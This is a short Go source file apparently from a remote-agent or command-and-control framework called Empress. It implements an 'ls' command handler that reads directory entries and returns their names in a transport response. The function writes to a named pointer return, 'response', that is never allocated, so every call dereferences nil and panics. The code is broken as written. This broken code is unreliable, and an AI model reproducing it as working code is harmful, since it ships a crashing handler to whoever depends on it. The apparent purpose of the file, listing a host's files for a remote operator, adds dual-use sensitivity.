package commands

import (
	"github.com/pygrum/Empress/transport"
	"os"
)

func CmdLS(req *transport.Request) (response *transport.Response) {
	if len(req.Args) == 0 {
		req.Args = append(req.Args, []byte("."))
	}
	for _, path := range req.Args {
		entries, err := os.ReadDir(string(path))
		if err != nil {
			response.Status = 1
			response.Responses = []transport.ResponseDetail{
				{Dest: 1, Data: []byte(err.Error())},
			}
			return
		}
		for _, d := range entries {
			response.Responses = append(response.Responses, transport.ResponseDetail{
				Dest: 1,
				Data: []byte(d.Name()),
			})
		}
	}
	return
}
